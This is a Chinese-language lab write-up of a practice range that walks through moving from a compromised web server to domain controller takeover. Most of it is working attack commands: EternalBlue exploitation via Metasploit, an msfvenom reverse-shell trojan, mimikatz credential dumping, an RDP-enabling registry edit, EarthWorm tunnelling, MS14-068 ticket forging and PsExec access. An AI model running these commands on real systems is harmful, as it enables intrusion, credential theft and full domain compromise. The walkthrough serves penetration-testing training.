# Yxcms靶场 | 向内网横向移动并拿到域控

**实验环境：**

靶场：Windows 7  ip 192.168.100.50

 

**靶场测试过程：**

通过前面的获取webshell拿到web服务器权限接下来向内网横向移动并使用ms14068软件攻击域控

 

1、进行内网网段扫描探测内网主机

注意：因为socks 协议与 icmp 协议有所不同所以使用扫描敏感端口的方式进行内网探测。  

使用 kali 上的 masscan 软件对 192.168.1.0/24 网段的 445，3389，80 端口进行探测

命令：proxychains nmap -sT -Pn -n -p 3389,80,445 192.168.1.107

因为实验环境知道内网主机的准确 IP 地址所以就不整个网段去进行扫描了使用代理运行 namp

\-sT 使用tcp 协议

\-Pn 跳过 ping 命令

\-n 不使用域名解析

\-p 指定端口

![](../Images/6abc6d3db6005de86c2e099f8e313279.png)

2、发现内网主机开放 445 端口尝试在 kali 里用永恒之蓝漏洞去攻击

打开 msf 攻击框架

命令：proxychains msfconsole

实验代理打开 msf 攻击框架

![](../Images/f6e6cf48fe21d302c0b8c2b97834e134.png)  

3、搜索永恒之蓝漏洞模块

命令：search ms17\_010

红色标记框是永恒之蓝检漏洞测模块

黄色标记框是永恒之蓝漏洞攻击模块

![](../Images/6fcc3f5d1e624983d42c33e1c2c8cffc.png)

4、先使用检测模块对内网主机进行漏洞检测auxiliary/scanner/smb/smb\_ms17\_010

命令：use auxiliary/scanner/smb/smb\_ms17\_010 使用漏洞检测模块

show options 查看设置参数

set rhosts 192.168.1.1047 设置检测目标

run 执行检测

![](../Images/47403cd25b769241cf8a54d6598754e8.png)  

5、确定有永恒之蓝漏洞使用攻击模块进行 getshell exploit/windows/smb/ms17\_010\_eternalblue 攻击模块

命令：use exploit/windows/smb/ms17\_010\_eternalblue 使用攻击模块

set payload windows/x64/meterpreter/reverse\_tcp 设 置

payload show options 查看设置参数

set lhost 192.168.100.143 设置攻击者 IP 地址

set rhosts 192.168.1.107 设置目标机IP 地址

run 进行攻击

![](../Images/6527d09282f9c93090f788f6ddd49307.png)

![](../Images/f4d71c579b379ec4c0ebd71d6f0217a3.png)

 6、获取 shell

命令：shell获取目标机的 shell

发现永痕之蓝漏洞无法获取 shell 所以我们使用木马的方式 get 目标机的shell

![](../Images/d636ce2eaf20c2e00d0df8347e62364f.png)

7、使用 msf 软件生成木马文件反弹shell 在 merterprete 先获取目标机的版本信息

命令：sysinfo

![](../Images/227a08849c21541ce5357b9d262ea7f8.png)

8、利用 msf 软件生成一个木马程序

命令：msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=192.168.100.143 lport=5555 -f exe -o shell.exe

![](../Images/3232153d48c5a193ed267d8c6406e93b.png)

9、利用 meterpreter 将木马上传到目标机内

命令：upload '/root/shell.exe'

![](../Images/90769afa7cacf0a580b414f09e3575fd.png)

10、在本机使用 msf 监听本机的 5555 端口接收 shell

命令：msfconsole

![](../Images/5e0d5f9faa39291db87c6386258a2adc.png)

命令：use exploit/multi/handler 使用监听模块

set payload windows/x64/meterpreter/reverse\_tcp 设 置

payload show options 查看参数

set lhost 192.168.100.143 设置攻击者IP 地址

set lport 5555 设置攻击和端口

run 开始监听

![](../Images/94ad987358f5a913b3a29287b1a8ff7f.png)

在 meterpreter 执行木马程序

命令：execute -f shell.exe

![](../Images/6fc232409d873244d8038b96abebdc4c.png)

查看是否成功获取到shell

命令：shell

![](../Images/d7169c1fe4838f110f7cc6c917e7d24b.png)

11、可以对目标机进行信息收集查看是否是域成员

注意：可能会出现乱码的情况

解决方式：输入命令：chcp65001

![](../Images/02fc0fa22bf9f2ec2e86f70559233bb0.png)

12、查看是否域内成员

命令：ipconfig /all

![](../Images/f77beb9ede799e2b19c0db36533c0b89.png)

13、查看当前操作权限

命令：whoami

![](../Images/02a7cd958f8cc9fb3d23d68f2e40e133.png)

14、在确定是域内成员之后上传 mimikaz 软件进行域的 hash 获取，使用永恒之蓝漏洞 meterpretre 上传 mimikaz 软件。

命令：upload '/root/mimikatz\_64.exe'

![](../Images/80d3b69b0ff407a436f072520b5bf5f6.png)

15、在 shell 执行 mimikaz 获取域 hash

命令：mimikatz\_64.exe

![](../Images/8b2eed7e3152f4f30a30d4b17574cd16.png)

16、开启目标机的 3389 端口然后反弹代理进行远程桌面连接

开启 3389 端口

命令：REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 0 /f

netstat –ano 查看端口

![](../Images/4f3d3af60f36c0b440b0d149dffabd70.png)

17、利用永恒之蓝漏洞 meterpre 上传ew 软件到目标机

命令：upload '/root/ew\_for\_Win.exe'

![](../Images/41b3dbd8a30c3773c2bc9f90e0116324.png)

18、在 kali 上监听自己的 1234 端口并且转移到本机的 1060 端口

命令：cd ew/ 切换到ew 目录下

ls 列出当前目录下所有文件

./ew\_for\_linux64 -s rcsocks\-l 1060 -e 1234

监听本机的 1234 端口并且转发到本机的 1060 端口

![](../Images/c2c884a52daaa01a0f3007788b9b9af9.png)

19、利用上传的 ew 软件将目标机的 3389 端口转发到 kali 的 1234 端口

命令：ew\_for\_Win.exe -s rssocks -d 192.168.100.143 -e 1234

![](../Images/302230227645a09683e1dce95fb26ab3.png)

20、因为一台 kali 不能拥有俩个代理所以在此之前将攻击域控的软件进行上传Mimikazt、s 扫描器、14068、PsExec.exe

命令：upload '/root/S.exe' 上传 s 扫描器

upload '/root/14068py.exe' 上传票据伪造工具

upload '/root/mimikatz\_trunk/x64/mimikatz.exe' 上 传 mimikazt upload '/ PsExec.exe ' 上传反弹脚本软件

![](../Images/c16ada1af9bf5897d7a43fa4bfaff22b.png)

21、在 kali 上设置代理利用 mimikazt 获取的登陆名和密码进行进行远程登陆Kali 设置代理的路径：etc/proxychains.conf

命令：vim /etc/proxychains.conf

使用 socks5 协议监听本主机的 1060 端口

![](../Images/46c20621d3cd62666bbf77c97921bbc0.png)

22、利用获取的 IP 地址和获取到用户名和密码进行远程连接目标机

命令：proxychains rdesktop 192.168.1.107 使用代理远程连接 19.168.1.107 用户名：test\\administrator

密码：1234.com

![](../Images/e93e462a584cc4944e3f47e00c054359.png)

![](../Images/39d27e90a90895df0d063121c432efb9.png)

23、对域进行信息收集查看当前权限

命令：whoami

![](../Images/cf32eaa1ca343a16b6305433e253c491.png)

24、获取域用户和域的 sid

命令：whoami /all

域用户 sid：S-1-5-21-3626197789-623757891-1747491499-500

域 sid：S-1-5-21-3626197789-623757891-1747491499

![](../Images/7b5c91422c90efc3f902db506004732a.png)

25、获取域名

命令：ipconfig /all    

域名：test.com

![](../Images/7b5c91422c90efc3f902db506004732a.png)

26、获取域控名称

命令：nltest /DCLIST:test.com

域控名：dc.test.com

![](../Images/9076d7a7f3134b89d2713d6aec14459a.png)

27、使用 s 扫描器扫描域内 IP 地址

命令：cd../.. 切换到 c 盘根目录

cd windows/system32 切换到上传文件的目录下

命令：S.exe tcp 10.1.1.0 10.1.1.254 445 512

使用 s 扫描器扫描 10.1.1.0 到 10.1.1.254 开放 445 端口的 IP 线程为 512 因为靶场环境只有一台域成员主机所以我们很快就能确定这就是域控 IP 地址：10.1.1.10

![](../Images/792cf8a2677ddb16f780ec494c0eb3e9.png)

28、在确定域控 IP 之后我们可以进行票据伪造的方式对域控进行攻击其实在这个靶场中我们直接就获取到了域控的权限

我采用 ms14068 的方式去伪造票据

首先利用远程管理桌面去上传文件的路径将 mimikazt 和 14068 软件移入到一个新建的文件夹 111 当中

文件默认上传路径：c:/windows/system32

![](../Images/33108c7ec08af3302da8c83064d8da52.png)

查看当前用户是否已经存在票据如果存在就删除

命令：klist 查看票据

Klist purge 删除已经存在的票据

![](../Images/18364600a4bde098ecabad522b68d103.png)

利用 14068 软件伪造票据发送票的tgt 文件

命令：cd desktop 切换到桌面

cd 111 切换到软件存放目录

14068py.exe -u administrator@test.com -p "1234.com" -s S-1-5-21-3626197789- 623757891-1747491499-500\-d dc.test.com 伪造 tgt 文件

![](../Images/defe1ba789d03ac311146c2fd0e8a047.png)

查看文件是否伪造成功

命令：dir

![](../Images/f215a196f01253f657bb13487cbdec06.png)

也可以利用远程桌面的图像化界面去查看

![](../Images/feaf71e5a89c555175f77593b0b7bcdb.png)

29、利用 mimikatz 软件进行票据伪造

命令：mimikatz.exe "kerberos::ptc TGT\_administrator@test.com.ccache" exit

        ptc 参数就是 14068 生成的文件全名称 ![](../Images/cd2c6826d58cf73c05b21086e4eaf3f5.png)

30、查看票据是否已经存在并且使用 ipc 去远程连接

命令：klist

\\\\dc\\c$

![](../Images/994a2f5befb02c5cfbfd35f3d5a698ca.png)

  

![](../Images/f01607674825e0137c07d7fde4ac3585.png)

 

![](../Images/4b4b204205def6f1189de90c8a802c90.png)

31、利用 psexec 软件去反弹域控制器的 shell

首先进入利用 kali 上传文件的目录下

路径：C:/windows/system32

命令：PsExec.exe \\\\10.1.1.10 -u administrator -p 1234.com

cmd IP 地址就是域控的 IP 地址

![](../Images/65b4fb305c96b1d7313a149a93b5e7c8.png)
